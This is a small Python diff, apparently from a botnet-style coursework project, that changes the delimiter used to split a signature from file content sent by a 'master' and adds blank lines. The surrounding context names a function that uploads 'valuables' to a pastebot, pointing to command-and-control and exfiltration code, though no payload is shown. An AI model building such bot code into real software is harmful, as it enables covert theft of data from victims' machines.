@@ -38,6 +38,7 @@ def upload_valuables_to_pastebot(fn):
 
 ###
 
+
 def verify_file(f):
     # Verify the file sent by the master using pycrypto verifier
     signature,content = extract_signature_and_content(f)
@@ -48,13 +49,15 @@ def verify_file(f):
 
 
 def extract_signature_and_content(f):
-    extracted_file = f.split(bytes("END\n","ascii"))
+    extracted_file = f.split(bytes("===\n","ascii"))
 
     if len(extracted_file) > 1:
         return extracted_file[0],extracted_file[1]
 
     else:
         return None,None
+
+
 def process_file(fn, f):
     if verify_file(f):
         # If it was, store it unmodified
